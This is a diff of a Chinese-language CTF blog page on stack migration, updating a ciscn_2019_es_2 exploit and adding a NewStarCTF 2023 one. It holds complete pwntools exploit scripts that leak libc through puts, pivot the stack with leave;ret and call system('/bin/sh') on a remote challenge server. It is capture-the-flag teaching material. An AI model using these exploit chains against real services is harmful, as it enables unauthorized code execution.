@@ -18,15 +18,16 @@
   
     <meta name="description" content="栈迁移&#x2F;栈劫持">
 <meta property="og:type" content="article">
-<meta property="og:title" content="Isolator&#39;s Blog">
+<meta property="og:title" content="Stack Migration">
 <meta property="og:url" content="https://isolator-1.github.io/2023/10/11/ctf-pwn/stack_migration/index.html">
 <meta property="og:site_name" content="Isolator&#39;s Blog">
 <meta property="og:description" content="栈迁移&#x2F;栈劫持">
 <meta property="og:locale" content="en_US">
 <meta property="og:image" content="https://isolator-1.github.io/img/stack_migration/1.jpg">
 <meta property="og:image" content="https://isolator-1.github.io/img/stack_migration/2.jpg">
+<meta property="og:image" content="https://isolator-1.github.io/img/stack_migration/3.jpg">
 <meta property="article:published_time" content="2023-10-11T06:10:00.000Z">
-<meta property="article:modified_time" content="2023-10-11T06:33:48.525Z">
+<meta property="article:modified_time" content="2023-10-11T07:55:03.989Z">
 <meta property="article:author" content="Isolator">
 <meta property="article:tag" content="ctf-pwn">
 <meta name="twitter:card" content="summary_large_image">
@@ -34,7 +35,7 @@
   
   
   
-  <title>Isolator&#39;s Blog</title>
+  <title>Stack Migration - Isolator&#39;s Blog</title>
 
   <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
@@ -199,7 +200,7 @@
       <div class="banner-text text-center fade-in-up">
         <div class="h2">
           
-            <span id="subtitle" data-typed-text=""></span>
+            <span id="subtitle" data-typed-text="Stack Migration"></span>
           
         </div>
 
@@ -222,7 +223,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          1.2k words
+          2.9k words
         
       </span>
     
@@ -233,7 +234,7 @@
         
         
         
-          11 mins
+          25 mins
         
       </span>
     
@@ -271,12 +272,13 @@
         <div id="board">
           <article class="post-content mx-auto">
             <!-- SEO header -->
-            <h1 style="display: none"></h1>
+            <h1 style="display: none">Stack Migration</h1>
             
             
               <div class="markdown-body">
                 
-                <h3 id="Stack-Migration"><a href="#Stack-Migration" class="headerlink" title="Stack Migration"></a>Stack Migration</h3><p><img src="/img/stack_migration/1.jpg" srcset="/img/loading.gif" lazyload></p>
+                <h3 id="Stack-Migration"><a href="#Stack-Migration" class="headerlink" title="Stack Migration"></a>Stack Migration</h3><h4 id="ciscn-2019-es-2"><a href="#ciscn-2019-es-2" class="headerlink" title="ciscn_2019_es_2"></a>ciscn_2019_es_2</h4><p><a target="_blank" rel="noopener" href="https://buuoj.cn/challenges#ciscn_2019_es_2">https://buuoj.cn/challenges#ciscn_2019_es_2</a></p>
+<p><img src="/img/stack_migration/1.jpg" srcset="/img/loading.gif" lazyload></p>
 <p>溢出的长度不足以写rop链，劫持rbp到一个足够大的空间里去</p>
 <p>首先通过调试查看ebp到可输入空间开头的距离</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">gdb.attach(p, <span class="hljs-string">&quot;b *0x080485FC&quot;</span>) <span class="hljs-comment"># 在python pwntools里下断点的方法（要放在开头），进去按一下c</span><br></code></pre></td></tr></table></figure>
@@ -290,7 +292,13 @@
 <p>这时，就相当于一个普通的rop了，system@plt为一个被溢出的返回地址，在他后面的是system的返回地址和它的参数，而”/bin/sh\x00”为一个字符串，需要一个指针指向它，因此需要计算一下binsh的地址。</p>
 <p>由于aaaa是ebp-0x38，binsh距离aaaa有16个字节，那么这个地方填上ebp-0x28，就能给system传进去binsh的参数了。</p>
 <p><strong>exp</strong></p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>r = process(<span class="hljs-string">&quot;./ciscn_2019_es_2&quot;</span>)<br><span class="hljs-comment">#r=remote(&#x27;node4.buuoj.cn&#x27;,25391)</span><br>gdb.attach(r, <span class="hljs-string">&quot;b *0x080485FC&quot;</span>) <br>sys=<span class="hljs-number">0x8048400</span><br>leave_ret=<span class="hljs-number">0x08048562</span><br>main=<span class="hljs-number">0xdeadbeef</span><br><br>payload=<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x27</span>+<span class="hljs-string">&#x27;b&#x27;</span><br>r.send(payload)<br>r.recvuntil(<span class="hljs-string">&quot;b&quot;</span>)<br>rbp = u32(r.recv(<span class="hljs-number">4</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(rbp))<br><br>payload2=<span class="hljs-string">b&#x27;aaaa&#x27;</span>+p32(sys)+p32(main)+<span class="hljs-string">b&quot;????&quot;</span>+<span class="hljs-string">b&quot;/bin/sh&quot;</span><br>payload2=payload2.ljust(<span class="hljs-number">0x28</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>payload2+=<span class="hljs-string">b&quot;????&quot;</span>+p32(leave_ret)<br><br>r.send(payload2)<br>r.interactive()<br></code></pre></td></tr></table></figure>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>r = process(<span class="hljs-string">&quot;./ciscn_2019_es_2&quot;</span>)<br><span class="hljs-comment">#r=remote(&#x27;node4.buuoj.cn&#x27;,25391)</span><br>gdb.attach(r, <span class="hljs-string">&quot;b *0x080485FC&quot;</span>) <br>sys=<span class="hljs-number">0x8048400</span><br>leave_ret=<span class="hljs-number">0x08048562</span><br>main=<span class="hljs-number">0xdeadbeef</span><br><br>payload=<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x27</span>+<span class="hljs-string">&#x27;b&#x27;</span><br>r.send(payload)<br>r.recvuntil(<span class="hljs-string">&quot;b&quot;</span>)<br>ebp = u32(r.recv(<span class="hljs-number">4</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(ebp))<br><br>payload2=<span class="hljs-string">b&#x27;aaaa&#x27;</span>+p32(sys)+p32(main)+p32(ebp-<span class="hljs-number">0x28</span>)+<span class="hljs-string">b&quot;/bin/sh&quot;</span><br>payload2=payload2.ljust(<span class="hljs-number">0x28</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>payload2+=p32(ebp-<span class="hljs-number">0x38</span>)+p32(leave_ret)<br><br>r.send(payload2)<br>r.interactive()<br></code></pre></td></tr></table></figure>
+
+<h4 id=""><a href="#" class="headerlink" title=""></a></h4><h4 id="NewStarCTF-2023"><a href="#NewStarCTF-2023" class="headerlink" title="NewStarCTF 2023"></a>NewStarCTF 2<strong>023</strong></h4><p>stack migration</p>
+<p><img src="/img/stack_migration/3.jpg" srcset="/img/loading.gif" lazyload></p>
+<p>和前面的唯一区别在于需要先泄露libc地址，题目又给了libc</p>
+<p>需要注意的还是不要sendline，因为会多一个\n，占掉了下一次输入，payload2就输入不进去了</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#p = process(&quot;./pwn&quot;)</span><br>p = remote(<span class="hljs-string">&quot;node4.buuoj.cn&quot;</span>,<span class="hljs-number">25029</span>)<br><br><span class="hljs-comment">#gdb.attach(p, &quot;b *0x4012a9&quot;)</span><br>e = ELF(<span class="hljs-string">&quot;./pwn&quot;</span>)<br><br><span class="hljs-comment">#context.log_level=&quot;debug&quot;</span><br><br>leave_ret = <span class="hljs-number">0x4012aa</span><br>poprdi_ret = <span class="hljs-number">0x401333</span><br>puts_got = e.got[<span class="hljs-string">&quot;puts&quot;</span>]<br>puts_plt = e.plt[<span class="hljs-string">&quot;puts&quot;</span>]<br><span class="hljs-comment">#main = e.sym[&quot;main&quot;]</span><br>main = <span class="hljs-number">0x4012ac</span><br>start = <span class="hljs-number">0x4010b0</span><br><br>p.recvuntil(<span class="hljs-string">b&quot;your name:\n&quot;</span>)<br>payload = <span class="hljs-string">b&quot;12345678&quot;</span><br>p.send(payload)<br>p.recvuntil(<span class="hljs-string">b&quot;I have a small gift for you: &quot;</span>)<br>buf_addr = <span class="hljs-built_in">eval</span>(p.recv(<span class="hljs-number">14</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(buf_addr))<br><br><br>p.recvuntil(<span class="hljs-string">b&quot;more infomation plz:\n&quot;</span>)<br>payload2 = ( p64(poprdi_ret) + p64(puts_got) + p64(puts_plt) + p64(start)).ljust(<span class="hljs-number">80</span>,<span class="hljs-string">b&#x27;a&#x27;</span>)<br>payload2+= p64(buf_addr) + p64(leave_ret)<br>p.send(payload2)<br><br><br>p.recvuntil(<span class="hljs-string">b&quot;maybe I&#x27;ll see you soon!\n&quot;</span>)<br><br>puts_addr = u64(p.recvuntil(<span class="hljs-string">b&quot;\x7f&quot;</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&quot;\x00&quot;</span>))<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;puts:----&quot;</span> + <span class="hljs-built_in">str</span>(<span class="hljs-built_in">hex</span>(puts_addr)))<br><br><br>libc = ELF(<span class="hljs-string">&quot;libc.so.6&quot;</span>)<br>libc.address =  puts_addr - libc.sym[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>system = libc.sym[<span class="hljs-string">&quot;system&quot;</span>]<br>binsh = <span class="hljs-built_in">next</span>(libc.search(<span class="hljs-string">b&quot;/bin/sh&quot;</span>))<br><br><br>p.recvuntil(<span class="hljs-string">b&quot;your name:\n&quot;</span>)<br>payload = <span class="hljs-string">b&quot;12345678&quot;</span><br>p.send(payload)<br>p.recvuntil(<span class="hljs-string">b&quot;I have a small gift for you: &quot;</span>)<br>buf_addr = <span class="hljs-built_in">eval</span>(p.recv(<span class="hljs-number">14</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(buf_addr))<br><br>p.recvuntil(<span class="hljs-string">b&quot;more infomation plz:\n&quot;</span>)<br>payload2 = (p64(poprdi_ret) + p64(binsh) + p64(system)).ljust(<span class="hljs-number">80</span>,<span class="hljs-string">b&quot;a&quot;</span>)<br>payload2+= p64(buf_addr) + p64(leave_ret)<br>p.sendline(payload2)<br><br>p.interactive()<br><br></code></pre></td></tr></table></figure>
 
 
                 
@@ -337,7 +345,7 @@
 
   <div class="license-box my-3">
     <div class="license-title">
-      <div></div>
+      <div>Stack Migration</div>
       <div>https://isolator-1.github.io/2023/10/11/ctf-pwn/stack_migration/</div>
     </div>
     <div class="license-meta">
